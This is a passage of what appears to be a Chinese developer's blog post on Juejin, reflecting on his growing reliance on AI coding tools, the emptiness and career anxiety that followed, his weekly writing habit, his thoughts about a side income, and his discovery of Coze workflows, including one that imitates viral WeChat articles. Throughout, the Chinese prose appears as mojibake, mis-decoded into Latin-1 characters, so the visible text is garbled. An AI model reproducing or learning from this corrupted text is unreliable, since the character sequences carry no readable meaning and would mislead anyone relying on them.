<p>æœ€æ—©æ¥è§¦ AIï¼Œå…¶å®è¿˜æ˜¯ä» ChatGPT å¼€å§‹çš„ã€‚ å¯¹æˆ‘æ¥è¯´ï¼Œå®ƒå°±åƒæ˜¯ä¸€ä½å…è´¹çš„ã€éšæ—¶èƒ½é—®çš„å…¨çŸ¥å…¨èƒ½è€å¸ˆï¼Œè™½ç„¶æœ‰æ—¶å€™ä¹Ÿä¼šçŠ¯ç‚¹ä½çº§é”™è¯¯ï¼Œä½†å¯¹å·¥ä½œçš„å¸®åŠ©ç¡®å®æ˜¯å®æ‰“å®çš„ã€‚å¾ˆå¤šä»¥å‰éœ€è¦è‡ªå·±ä¸€ç‚¹ç‚¹æŸ¥èµ„æ–™ã€ç¿»æ–‡æ¡£ã€å¯¹ç€æŠ¥é”™åå¤è¯•çš„é—®é¢˜ï¼Œç°åœ¨åªè¦æŠŠä¿¡æ¯è´´è¿›å»ï¼Œå°±èƒ½å¾ˆå¿«æ‹¿åˆ°ä¸€ä¸ªæ€è·¯ï¼ŒçŸ¥é“è¯¥ä»å“ªä¸‹æ‰‹ã€‚
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b5d6c8a4d4674d0b941bfc4e993458e7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rSb5Y2h5Y2h5LqG:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768441804&amp;x-signature=huySxIpiyacsRl25ZbosCBYWrrM%3D" alt="" loading="lazy"/></p>
<p>åæ¥æˆ‘å¼€å§‹åœ¨ä»£ç å·¥å…·é‡Œæ¥å…¥ GitHub Copilotï¼Œè¿™ç§å˜åŒ–å°±æ›´æ˜æ˜¾äº†ã€‚å†™ä»£ç çš„æ—¶å€™ï¼Œæˆ‘æ€»æ˜¯å…ˆå†™ä¸ªæ³¨é‡Šï¼Œç­‰ç€ AI æŠŠä»£ç è¡¥å…¨ï¼Œç„¶å Tab å›è½¦ã€‚å“ªæ€•æ˜¯å¾ˆç®€å•çš„åŠŸèƒ½ï¼Œä¹Ÿæ‡’å¾—å†æ‰‹æ‰“ä¸€éï¼Œæ…¢æ…¢åœ°ï¼Œç”šè‡³å·²ç»ä¹ æƒ¯äº†è¿™ç§ç­‰è¡¥å…¨çš„èŠ‚å¥ã€‚å·¥ä½œå˜å¾—æ›´è½»æ¾ï¼Œé‡åˆ°é—®é¢˜å’Œ bugï¼Œä¹Ÿå¾ˆå°‘å†å»ç™¾åº¦ç¿»ä¸€å †æ–¹æ¡ˆï¼Œæˆ–è€…åˆ°å¤„é—®åŒäº‹ï¼Œæ›´ä¸ç”¨è¯´ç†¬å¤œç ”ç©¶ã€‚</p>
<p>æœ‰æ—¶å€™æƒ³èµ·ä»¥å‰çš„åœºæ™¯ã€‚ä¸ºäº†å®šä½ä¸€ä¸ªé—®é¢˜ï¼Œå’Œæˆ‘å“¥ä¸€èµ·è¯­éŸ³æ²Ÿé€šç†¬äº†ä¸€ä¸ªé€šå®µï¼Œä¸€è¡Œä¸€è¡Œåœ°çœ‹æ—¥å¿—ã€è¯•æ–¹æ¡ˆï¼Œç¬¬äºŒå¤©äººæ˜¯é å’–å•¡ç¡¬æ’‘çš„ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f9f8a265e4f347f1a2d439ee3d177770~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rSb5Y2h5Y2h5LqG:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768441804&amp;x-signature=hC5pusfRjIPMk%2FxlgvEv2Pdt3HQ%3D" alt="aaaaa" loading="lazy"/></p>
<p>è€Œç°åœ¨ï¼Œå¤§å¤šæ•°ç±»ä¼¼çš„é—®é¢˜ï¼Œå¯èƒ½å°±æ˜¯æŠŠæŠ¥é”™è´´ç»™ AIï¼Œé¡ºç€ç»™åˆ°çš„æ–¹å‘æ”¹ä¸€æ”¹ï¼Œäº‹æƒ…å°±ç»“æŸäº†ã€‚é‚£æ—¶å€™æˆ‘è¿˜æ²¡æ„è¯†åˆ°ï¼Œè¿™ç§â€œè½»æ¾â€ï¼Œå…¶å®åªæ˜¯ä¸€ä¸ªå¼€å§‹ã€‚</p>
<hr/>
<h3 data-id="heading-2">ä¸‰ Â· å½“ AI è¿›äº†ç¼–è¾‘å™¨ï¼Œæˆ‘å¼€å§‹åªè¦ç»“æœ</h3>
<p>å½“ AI çœŸæ­£è¿›å…¥ä»£ç ç¼–è¾‘å™¨ä¹‹åï¼Œæˆ‘å†™ä»£ç çš„æ–¹å¼å½»åº•å˜äº†ã€‚ å¼€å§‹ç”¨ä¸Š Cursorã€Trae è¿™äº› AI ç¼–è¾‘å™¨åï¼Œæ„Ÿè§‰å’Œä¹‹å‰å·²ç»å®Œå…¨ä¸æ˜¯ä¸€ä¸ªçŠ¶æ€äº†ã€‚ä»¥å‰æ›´å¤šè¿˜æ˜¯äººå†™ã€AI è¾…åŠ©ï¼Œè€Œç°åœ¨æ›´åƒæ˜¯äººç»™æ„å›¾ï¼ŒAI ç›´æ¥ç»™ç»“æœã€‚å¾ˆå¤šæ—¶å€™ï¼Œæˆ‘åªéœ€è¦ç®€å•æè¿°ä¸€ä¸‹è¦åšä»€ä¹ˆï¼Œç”šè‡³è¿æ³¨é‡Šéƒ½æ‡’å¾—å†™æ¸…æ¥šï¼Œå‰©ä¸‹çš„å°±äº¤ç»™ AI å»è¡¥å…¨ã€å»æ”¹ã€å»é‡æ„ã€‚</p>
<p>è¿™ç§å˜åŒ–ï¼Œå…¶å®æ˜¯æ‚„æ‚„å‘ç”Ÿçš„ã€‚ ä¸€å¼€å§‹åªæ˜¯è§‰å¾—å¿«ï¼Œåæ¥æ…¢æ…¢å˜æˆäº†ä¹ æƒ¯ã€‚é‡åˆ°é—®é¢˜ï¼Œä¸‹æ„è¯†å°±è®© AI ç›´æ¥ç»™æ–¹æ¡ˆï¼›ä»£ç ä¸æ»¡æ„ï¼Œå°±è®©å®ƒé‡å†™ä¸€ç‰ˆï¼›é€»è¾‘æœ‰ç‚¹ä¹±ï¼Œå°±è®©å®ƒé¡ºä¸€éã€‚ä»¥å‰è¿˜ä¼šè‡ªå·±ä¸€ç‚¹ç‚¹æ¨æ¼”ã€éªŒè¯ï¼Œç°åœ¨æ›´å¤šæ˜¯åœ¨å‡ ä¸ªç»“æœä¹‹é—´åšé€‰æ‹©ã€‚ä»£ç å†™å¾—æ›´å¿«äº†ï¼Œä½†äººå‚ä¸çš„æ–¹å¼ï¼Œå·²ç»æ˜æ˜¾ä¸ä¸€æ ·äº†ã€‚</p>
<p><strong>ä»¥å‰è¿˜ä¼šäº«å—ä¸€ä¸‹è§£å†³é—®é¢˜çš„è¿‡ç¨‹ï¼Œç°åœ¨åªæƒ³è¦ç»“æœï¼Œè¿‡ç¨‹å¥½åƒä¹Ÿæ²¡é‚£ä¹ˆé‡è¦äº†ã€‚</strong></p>
<hr/>
<h3 data-id="heading-3">å›› Â· è½»æ¾åˆ°ä¸€å®šç¨‹åº¦ï¼Œäººåè€Œå¼€å§‹ç©ºè™š</h3>
<p>å½“è§£å†³é—®é¢˜ä¸å†éœ€è¦æˆ‘æ—¶ï¼Œå†™ä»£ç è¿™ä»¶äº‹ï¼Œåè€Œå¼€å§‹å˜å¾—æ— è¶£ã€‚ æµç¨‹è¶Šæ¥è¶Šé¡ºï¼Œé—®é¢˜è¶Šæ¥è¶Šå°‘ï¼Œå¾ˆå¤šäº‹æƒ…å‡ ä¹æ˜¯ä¸¢ç»™ AI å°±ç»“æŸã€‚æ‘¸é±¼çš„æ—¶é—´è‡ªç„¶å˜é•¿äº†ï¼Œä½†äººå´å¹¶æ²¡æœ‰å› æ­¤æ›´è½»æ¾ï¼Œåè€Œå¸¸å¸¸æ˜¯ä¸€ç§è¯´ä¸ä¸Šæ¥çš„ç©ºã€‚æ„Ÿè§‰æ—¥å­è¶Šæ¥è¶Šæ— è¶£ ä¸çŸ¥é“å¹²ä»€ä¹ˆã€‚æ¯å¤©ååœ¨ç”µè„‘å‰ï¼Œçœ‹ç€ä»£ç åœ¨è·‘ã€åŠŸèƒ½åœ¨äº¤ä»˜ï¼Œå´å¾ˆå°‘å†æœ‰é‚£ç§â€œé—®é¢˜è¢«æˆ‘æå®šäº†â€çš„æˆå°±æ„Ÿï¼Œæ›´å¤šæ—¶å€™åªæ˜¯æææƒšæƒšåœ°æŠŠä¸€å¤©ç†¬è¿‡å»ã€‚</p>
<p>è¿™ç§çŠ¶æ€æŒç»­äº†ä¸€æ®µæ—¶é—´ä¹‹åï¼Œç„¦è™‘ä¹Ÿæ…¢æ…¢æµ®äº†ä¸Šæ¥ã€‚ AI è®©å¾ˆå¤šèƒ½åŠ›è¢«å¿«é€Ÿæ‹‰å¹³ï¼ŒåŸæœ¬éœ€è¦ç»éªŒå †å‡ºæ¥çš„ä¸œè¥¿ï¼Œç°åœ¨å‡ ä¹æˆäº†æ ‡é…ã€‚éƒ½è¯´AIæ‹‰è¿‘äº†èœé¸Ÿå’Œå¤§ä½¬ä¹‹é—´çš„è·ç¦»ï¼Œç¡®å®é€šè¿‡AIè®©æˆ‘å†™å‡ºæ¥ä¹‹å‰æ ¹æœ¬å†™ä¸å‡ºæ¥çš„æ‰€è°“çš„é«˜è´¨é‡ï¼Œé«˜æ€§èƒ½ä»£ç ï¼Œä½†åŒæ—¶ä¹Ÿè®©æˆ‘åå¹´ç»éªŒå¸¦æ¥çš„ä¼˜åŠ¿å¼€å§‹å˜å¾—æ¨¡ç³Šï¼Œå†å åŠ è¡Œä¸šç¯å¢ƒå’Œå°±ä¸šå‹åŠ›ï¼Œè¿™ç§ä¸å®‰ä¼šè¢«ä¸æ–­æ”¾å¤§ã€‚<strong>AI æ‹‰è¿‘äº†èœé¸Ÿå’Œå¤§ä½¬çš„è·ç¦»ï¼Œä¹Ÿè®©æˆ‘å¼€å§‹é‡æ–°æ€€ç–‘è‡ªå·±çš„ä»·å€¼ã€‚</strong></p>
<hr/>
<h3 data-id="heading-4">äº” Â· å”¯ä¸€è®©æˆ‘è®¤çœŸèµ·æ¥çš„ï¼Œæ˜¯æ¯å‘¨é‚£ä¸€ç¯‡æ€»ç»“</h3>
<p>é‚£æ®µæ—¶é—´é‡Œï¼Œå”¯ä¸€è¿˜èƒ½è®©æˆ‘æèµ·ç²¾ç¥çš„ï¼Œåªå‰©ä¸‹æ¯å‘¨å†™ä¸€ç¯‡æ€»ç»“ã€‚ å·¥ä½œè¶Šæ¥è¶Šé¡ºï¼Œå¿ƒå´è¶Šæ¥è¶Šæ…Œã€‚AI æ‹‰å¹³èƒ½åŠ›çš„é€Ÿåº¦è¿œæ¯”æˆ‘é¢„æƒ³å¾—å¿«ï¼Œåå¹´ç»éªŒå¸¦æ¥çš„å®‰å…¨æ„Ÿåœ¨ä¸€ç‚¹ç‚¹è¢«ç¨€é‡Šï¼Œå†åŠ ä¸Šè¡Œä¸šç¯å¢ƒæŒç»­æ”¶ç´§ï¼Œè¿™ç§ä¸å®‰ä¼šåœ¨æ—¥å¸¸é‡Œè¢«ä¸æ–­æ”¾å¤§ã€‚åœ¨è¿™ç§çŠ¶æ€ä¸‹ï¼Œå†™æ–‡ç« ã€åšæ€»ç»“ã€åšå¤ç›˜ï¼Œæ…¢æ…¢å˜æˆäº†ä¸€ç§è‡ªæˆ‘æ ¡å‡†çš„æ–¹å¼ã€‚ä¸æ˜¯ä¸ºäº†è¾“å‡ºç»™è°çœ‹ï¼Œè€Œæ˜¯é€¼ç€è‡ªå·±æŠŠä¸€å‘¨çš„æ€è·¯é‡æ–°æ‹ä¸€éï¼Œç¡®è®¤è‡ªå·±æ˜¯ä¸æ˜¯è¿˜åœ¨å¾€å‰èµ°ã€‚</p>
<p>æˆ‘å¼€å§‹æœ‰æ„è¯†åœ°å»å†™ã€å»æ•´ç†ã€å»å¤ç›˜ï¼Œä¹Ÿå¼€å§‹å°è¯•åšä¸€äº›ä»¥å‰ä¸å¤ªæ•¢ç¢°çš„äº‹æƒ…ã€‚å€Ÿç€ AI çš„èƒ½åŠ›ï¼Œå»æ¨¡æ‹Ÿã€å»æ‹†è§£ä¸€äº›åŸæœ¬æ¥è§¦ä¸åˆ°çš„æŠ€æœ¯æ¶æ„ï¼Œå»éªŒè¯è‡ªå·±çš„ç†è§£æ˜¯ä¸æ˜¯è¿˜ç«™å¾—ä½è„šã€‚åœ¨ AI å‡ ä¹â€œå…¨çŸ¥å…¨èƒ½â€çš„èƒŒæ™¯ä¸‹ï¼Œè¿™ç§ä¸»åŠ¨æ€è€ƒå’Œå°è¯•ï¼Œåè€Œæˆäº†æˆ‘ç¡®è®¤è‡ªèº«æŠ€æœ¯åˆ¤æ–­çš„ä¸€ç§æ–¹å¼ã€‚<strong>ä¼¼ä¹åªæœ‰è¿™æ ·ï¼Œæ—¥å¤ä¸€æ—¥çš„å¿ƒç†ï¼Œæ‰èƒ½å¾—åˆ°ä¸€ç‚¹ç‚¹å®‰æ…°ã€‚</strong></p>
<p>åæ¥æˆ‘å‘ç°ä¸€ä»¶æŒºé‡è¦çš„äº‹ã€‚ è¿™äº›æ¯å‘¨å†™ä¸‹æ¥çš„æ€»ç»“ï¼Œåœ¨ AI çš„è¾…åŠ©ä¸‹ï¼Œæ…¢æ…¢å˜å¾—æ›´å®Œæ•´ï¼Œä¹Ÿæ›´å®¹æ˜“åšæŒã€‚AI å¸®æˆ‘æ•´ç†ç»“æ„ã€è¡¥å…¨è¡¨è¾¾ã€æŠŠé›¶æ•£çš„æƒ³æ³•æ‹æ¸…æ¥šï¼Œä½†æœ€ç»ˆè¦ä¸è¦å†™ã€å†™ä»€ä¹ˆã€å†™æˆä»€ä¹ˆæ ·ï¼Œè¿˜æ˜¯å¾—æˆ‘è‡ªå·±æ¥å†³å®šã€‚ä¹Ÿæ­£æ˜¯å› ä¸ºè¿™æ ·ï¼Œæˆ‘æ‰èƒ½åœ¨é‚£æ®µçŠ¶æ€å¹¶ä¸ç®—å¥½çš„æ—¶é—´é‡Œï¼Œä¸€ç›´ä¿æŒç€ç›¸å¯¹ç¨³å®šçš„è¾“å‡ºã€‚</p>
<p>ç›´åˆ°å¹´åº•çŸ¥é“è‡ªå·±è¢«æ˜é‡‘è¯„ä¸ºã€Œæ˜é‡‘ 2025 å¹´åº¦ä¼˜è´¨ä½œè€…ã€ï¼Œä¹Ÿè·å¾—äº†ä¸€äº›ç²‰ä¸ï¼Œå¾—åˆ°ä¸€äº›æ˜å‹ä»¬çš„è®¤å¯ã€‚ç¬¬ä¸€ååº”å¹¶ä¸æ˜¯å…´å¥‹ï¼Œè€Œæ˜¯ä¸€ç§æ¾äº†ä¸€å£æ°”çš„æ„Ÿè§‰ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9e6d11272b974f93a6d878ffc05d678a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rSb5Y2h5Y2h5LqG:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768441804&amp;x-signature=F6LDvdiJs6f6wiMUV0I8ne3MEbE%3D" alt="image-20260107152433981" loading="lazy"/></p>
<p>å®ƒå¹¶ä¸æ„å‘³ç€æˆ‘åšå¾—æœ‰å¤šå¥½ï¼Œä½†è‡³å°‘è®©æˆ‘ç¡®è®¤äº†ä¸€ä»¶äº‹ï¼šåœ¨è¢« AI æ¨ç€å¾€å‰èµ°çš„è¿™ä¸€å¹´é‡Œï¼Œæˆ‘æ¯å¤©èŠ±åœ¨æ•´ç†ã€æ€è€ƒã€è®°å½•ä¸Šçš„æ—¶é—´ï¼Œå¹¶æ²¡æœ‰è¢«æµªè´¹ã€‚å“ªæ€•åªæ˜¯å†™æ–‡ç« è¿™ä»¶äº‹ï¼Œä¹Ÿè®©æˆ‘è§‰å¾—ï¼Œè‡ªå·±çš„æ—¥å­å¹¶ä¸æ˜¯å®Œå…¨è™šåº¦çš„ã€‚</p>
<p>ä¹Ÿæ­£æ˜¯åœ¨è¿™äº›æ€»ç»“å’Œå¤ç›˜é‡Œï¼Œæˆ‘å¼€å§‹åå¤æ€è€ƒä¸€ä¸ªé—®é¢˜ï¼š <strong>å¦‚æœæˆ‘åªæ˜¯åœç•™åœ¨ç”¨ AIï¼Œé‚£æ¥ä¸‹æ¥ï¼Œæˆ‘åˆ°åº•è¯¥å¾€å“ªèµ°ï¼Ÿ</strong> é‚£æ—¶å€™çš„æˆ‘è¿˜ä»¥ä¸ºï¼Œè‡ªå·±å¯¹ AI çš„æœŸå¾…ï¼Œå¯èƒ½ä¹Ÿåªä¼šåœç•™åœ¨å·¥ä½œå±‚é¢ã€‚</p>
<hr/>
<h3 data-id="heading-5">å…­ Â· å‰¯ä¸šç„¦è™‘ï¼šæƒ³æ”¹å˜ï¼Œä½†å§‹ç»ˆè¿ˆä¸å‡ºç¬¬ä¸€æ­¥</h3>
<p>æˆ‘å¼€å§‹è®¤çœŸæ€è€ƒå‰¯ä¸šï¼Œä½†å¾ˆå¿«å°±å‘ç°ï¼Œè¿™æ¡è·¯å¹¶ä¸è½»æ¾ã€‚ ä¹Ÿè®¸æ˜¯ç¨‹åºå‘˜å¯’å†¬çš„å½±å“ï¼Œä¹Ÿè®¸æ˜¯æ¯å¤©æ‘¸é±¼å¸¦æ¥çš„ç©ºè™šæ„Ÿï¼Œåˆæˆ–è€…æ˜¯å› ä¸ºè‡ªå·±è´Ÿå€ºæƒ³å¤šä¸€ä»½æ”¶å…¥ã€‚æ€»ä¹‹ï¼Œå¿µå¤´æœ‰äº†ï¼Œè¡ŒåŠ¨å´å§‹ç»ˆè·Ÿä¸ä¸Šã€‚è¦ä¹ˆè§‰å¾—æ–¹å‘ä¸å¥½æ‰¾ï¼Œè¦ä¹ˆæ‹…å¿ƒä¸é è°±ï¼Œè¦ä¹ˆæä¸èµ·å…´è¶£ï¼Œè¦ä¹ˆåˆšå¼€å§‹å°±å‘ç°å¾ˆéš¾åšæŒä¸‹å»ã€‚æ€»ä¹‹ç†ç”±ä¸€å¤§å †ï¼Œä½†ç»“æœå§‹ç»ˆæ²¡ä»€ä¹ˆæ”¹å˜ã€‚</p>
<p>æ›´ç°å®çš„ä¸€ç‚¹æ˜¯ï¼Œå¤§å¤šæ•°äººç°åœ¨è¿˜æ˜¯åœ¨ä¸Šç­ï¼Œå¹¶ä¸æ˜¯ç‹¬ç«‹å¼€å‘è€…ï¼Œä¹Ÿä¸æ˜¯è‡ªç”±èŒä¸šã€‚åœ¨è¿™ç§çŠ¶æ€ä¸‹å»æå‰¯ä¸šï¼Œå¾€å¾€ä¼šå¡åœ¨ä¸¤ä¸ªå¾ˆå®é™…çš„é—®é¢˜ä¸Šã€‚ç¬¬ä¸€ä¸ªæ˜¯å¤ªåƒæŒç»­æŠ•å…¥ï¼Œéœ€è¦é•¿æœŸã€ç¨³å®šåœ°å¾€é‡Œç ¸æ—¶é—´ï¼›ç¬¬äºŒä¸ªæ˜¯å­¦ä¹ æˆæœ¬é«˜ï¼Œè€Œä¸”ä¸€æ—¦ä¸­æ–­ï¼Œå°±å¾ˆéš¾å†æ¥å¾—ä¸Šã€‚æˆ‘ä»¬ç»å¸¸çœ‹åˆ°åˆ«äººåˆ†äº«å‰ªè§†é¢‘ã€åšæ¼«ç”»ã€å†™å…¬ä¼—å·ï¼Œçœ‹èµ·æ¥å¥½åƒéƒ½æŒºè½»æ¾ï¼Œä½†çœŸè½®åˆ°è‡ªå·±ä¸Šæ‰‹æ‰å‘ç°ï¼Œæ¯ä¸€ä¸ªæ–¹å‘éƒ½éœ€è¦ä¸æ–­å­¦æ–°ä¸œè¥¿ã€ç»ƒæ‰‹æ„Ÿã€è·ŸèŠ‚å¥ã€‚</p>
<p>æ›´éº»çƒ¦çš„æ˜¯ï¼Œå½“å·¥ä½œä¸€å¿™ï¼Œä¸­æ–­ä¸€æ®µæ—¶é—´ï¼Œå†æƒ³æ¡èµ·æ¥ï¼Œæˆæœ¬åè€Œæ›´é«˜ã€‚ä¸æ­¤åŒæ—¶ï¼Œæˆ‘ä»¬åœ¨æŠ•å…¥è¿™äº›æ—¶é—´çš„æ—¶å€™ï¼Œå…¶å®ä¹Ÿå¾ˆéš¾åˆ¤æ–­ï¼Œè¿™ä¸ªæ–¹å‘åˆ°åº•èƒ½ä¸èƒ½çœ‹åˆ°æœªæ¥ã€‚ä¹…è€Œä¹…ä¹‹ï¼Œå¾ˆå¤šäººè¿˜æ˜¯ä¼šé€€å›åˆ°æœ€ç†Ÿæ‚‰ã€ä¹Ÿæœ€çœå¿ƒçš„é‚£æ¡è·¯ä¸Šï¼Œåœ¨â€œæƒ³èµšé’±â€â€œæƒ³çŸ­æœŸå˜ç°â€â€œåˆä¸æƒ³é•¿æœŸåšæŒâ€ä¹‹é—´åå¤æ‘‡æ‘†ã€‚<strong>æˆ‘æ€»æ˜¯åœ¨â€œå†ç­‰ç­‰â€â€œä¸é è°±â€â€œæ²¡å…´è¶£â€è¿™äº›ç†ç”±ä¸­æ¥å›æ¨ªè·³ã€‚</strong></p>
<hr/>
<h3 data-id="heading-6">ä¸ƒ Â· æœ‹å‹çš„å…¬ä¼—å·æ”¶å…¥ï¼Œç¬¬ä¸€æ¬¡æŠŠå‰¯ä¸šæ‹‰å›ç°å®</h3>
<p>çœŸæ­£è®©æˆ‘åŠ¨å¿ƒçš„ï¼Œå¹¶ä¸æ˜¯å“ªç¯‡æ•™ç¨‹ï¼Œè€Œæ˜¯èº«è¾¹ä¸€ä¸ªæœ‹å‹çš„çœŸå®æ”¶å…¥ã€‚ ä»–ä¸€ç›´åœ¨åšå…¬ä¼—å·ï¼Œè®°å½•è‡ªå·±çš„å·¥ä½œæ—¥è®°ï¼Œå¾ˆå¤§ä¼—ï¼Œå¾ˆæ™®é€šï¼Œç²‰ä¸ä¹Ÿä¸ç®—å¤¸å¼ ï¼Œä½†è¿è¥å¾—æ¯”è¾ƒç¨³å®šï¼Œåæ¥å¼€é€šäº†æµé‡ä¸»ï¼Œæ¯ä¸ªæœˆéƒ½ä¼šæœ‰æ”¶å…¥ï¼Œå¥½çš„æ—¶å€™ç”šè‡³èƒ½æœ‰å¥½å‡ åƒã€‚ä¸æ˜¯æš´å¯Œé‚£ç§ï¼Œä½†èƒœåœ¨æ¸…æ™°ã€å¯é¢„æœŸï¼Œä¹Ÿè¶³å¤ŸçœŸå®ã€‚</p>
<p>é‚£ä¸€åˆ»æˆ‘å¿ƒé‡Œå…¶å®æ˜¯æœ‰æ³¢åŠ¨çš„ï¼Œå°±åƒæ˜¯æ‰“å¼€äº†ä¸€æ‰‡å¤§é—¨ã€‚ åŸæ¥å‰¯ä¸šè¿™ä»¶äº‹ï¼Œå¹¶ä¸ä¸€å®šéè¦æå¾—å¤šå¤æ‚ï¼Œä¹Ÿä¸æ˜¯åªæœ‰æå°‘æ•°äººæ‰èƒ½åšåˆ°ã€‚å®ƒç¬¬ä¸€æ¬¡ä»â€œåˆ«äººæ•…äº‹é‡Œçš„æˆåŠŸæ¡ˆä¾‹â€ï¼Œå˜æˆäº†ä¸€ä¸ªå‘ç”Ÿåœ¨æˆ‘èº«è¾¹çš„ç°å®å¯èƒ½ã€‚æˆ‘å¼€å§‹è®¤çœŸæƒ³ï¼Œå¦‚æœæ˜¯æˆ‘ï¼Œèƒ½ä¸èƒ½ä¹Ÿè¯•ç€èµ°è¿™æ¡è·¯ã€‚</p>
<p>ä½†å¿ƒåŠ¨å½’å¿ƒåŠ¨ï¼ŒçŠ¹è±«ä¹ŸåŒæ ·çœŸå®ã€‚ æˆ‘æƒ³åšï¼Œå´åˆå¾ˆæ¸…æ¥šè‡ªå·±çš„é—®é¢˜åœ¨å“ªâ€”â€”æ€•åšæŒä¸ä¸‹å»ï¼Œæ€•çƒ­æƒ…æ¥å¾—å¿«ã€é€€å¾—ä¹Ÿå¿«ï¼Œæœ€åè¿˜æ˜¯ä¸äº†äº†ä¹‹ã€‚<strong>æˆ‘æƒ³åšï¼Œä½†æˆ‘æ›´æ€•ï¼Œè‡ªå·±åˆæ˜¯ä¸‰åˆ†é’Ÿçƒ­åº¦ã€‚</strong></p>
<hr/>
<h3 data-id="heading-7">å…« Â· çœŸæ­£çš„è½¬æŠ˜ç‚¹ï¼šæˆ‘é‡æ–°æƒ³èµ·äº†â€œæ‰£å­å·¥ä½œæµâ€</h3>
<p>ç›´åˆ°æœ‰ä¸€å¤©ï¼Œæˆ‘çœ‹åˆ°äº†ä¸€ç¯‡â€œä¸€é”®ä»¿çˆ†æ¬¾åˆ°è‰ç¨¿ç®±â€çš„æ–‡ç« ã€‚ å†…å®¹æœ¬èº«å¹¶ä¸å¤æ‚ï¼Œå¤§æ¦‚å°±æ˜¯é€šè¿‡æ‰£å­å·¥ä½œæµï¼ŒæŠŠå·²ç»è·‘å¾—ä¸é”™çš„å…¬ä¼—å·æ–‡ç« æŠ“ä¸‹æ¥ï¼Œæ‹†ç»“æ„ã€å®šé£æ ¼ï¼Œç„¶åç›´æ¥ç”Ÿæˆä¸€ç¯‡æ–°çš„å†…å®¹ï¼Œä¸¢è¿›è‰ç¨¿ç®±ã€‚é‚£ä¸€åˆ»æˆ‘çªç„¶æƒ³èµ·æ¥ï¼Œè‡ªå·±å…¶å®æ—©å°±å¬è¯´è¿‡æ‰£å­å·¥ä½œæµï¼Œåªæ˜¯ä¹‹å‰ä¸€ç›´æ²¡çœŸæ­£å¾€å¿ƒé‡Œå»ã€‚</p>
<p>å’Œå†™ä»£ç æ—¶é‚£ç§æé«˜æ•ˆç‡çš„æ„Ÿè§‰åˆä¸å¤ªä¸€æ ·ï¼Œè¿™æ¬¡è®©æˆ‘éœ‡äº†ä¸€ä¸‹çš„æ˜¯ï¼š <strong>åŸæ¥ AI åœ¨éä»£ç é¢†åŸŸï¼ŒåŒæ ·å¯ä»¥è¿™ä¹ˆæœ‰åŠ›é‡ã€‚</strong> å®ƒä¸åªæ˜¯å¸®äººå†™å‡ è¡Œä»£ç ï¼Œè€Œæ˜¯å¯ä»¥å‚ä¸åˆ°å†…å®¹ç”Ÿäº§ã€æµç¨‹æ‹†è§£ï¼Œç”šè‡³æ˜¯æ•´ä¸ªåˆ›ä½œé“¾è·¯é‡Œã€‚é‚£ä¸€åˆ»æˆ‘ç¬¬ä¸€æ¬¡å¾ˆæ¸…æ™°åœ°æ„è¯†åˆ°ï¼ŒAI å¯èƒ½å¹¶ä¸æ˜¯åªæœåŠ¡äºç¨‹åºå‘˜çš„å·¥å…·ï¼Œå®ƒä¹Ÿè®¸èƒ½å¸®æˆ‘è·¨è¿‡ä¸€äº›åŸæœ¬å®Œå…¨ä¸æ•¢ç¢°çš„é¢†åŸŸã€‚</p>
<p>çœŸæ­£å¼€å§‹åŠ¨æ‰‹å­¦æ‰£å­å·¥ä½œæµä¹‹åï¼Œè¿™ç§æ„Ÿè§‰å˜å¾—æ›´æ˜æ˜¾äº†ã€‚æˆ‘å¼€å§‹å»å­¦ä¹ åˆ›ä½œå„ç§å„æ ·çš„å·¥ä½œæµï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b55f33e5f17c4f4b8bd6411255ef1232~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rSb5Y2h5Y2h5LqG:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768441804&amp;x-signature=HTjbHYociJnPAGlvKYCqaGWOmTg%3D" alt="image-20260107154222082" loading="lazy"/></p>
<p>å½“æˆ‘æŠŠç¬¬ä¸€æ¡æµç¨‹è·‘é€šä¹‹åï¼Œå¾ˆå¤šä¹‹å‰å›°æ‰°æˆ‘çš„é—®é¢˜çªç„¶å˜å¾—ä¸é‚£ä¹ˆè‡´å‘½äº†ã€‚ æ¯”å¦‚èƒ½ä¸èƒ½åŒæ—¶èµ·å¤šä¸ªå…¬ä¼—å·ã€ä¸åŒæ–¹å‘è¦ä¸è¦åˆ†å¼€è¯•ã€ä¼šä¸ä¼šä¸€å¼€å§‹å°±æŠŠç²¾åŠ›è€—å…‰ã€‚è¿™äº›é—®é¢˜ä¸å†å®Œå…¨å‹åœ¨äººè¦ä¸è¦åšæŒä¸Šï¼Œè€Œæ˜¯è¢«æ‹†æˆäº†ä¸€ä¸ªä¸ªæµç¨‹èŠ‚ç‚¹ï¼Œå¯ä»¥è°ƒæ•´ã€å¯ä»¥å¤ç”¨ã€ä¹Ÿå¯ä»¥éšæ—¶åœæ‰ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/761732131f2948918b9f6e1364a5a139~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rSb5Y2h5Y2h5LqG:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768441804&amp;x-signature=mqqG55nUKy3mxf9HWJKDDT2eyvs%3D" alt="image-20260107154337811" loading="lazy"/></p>
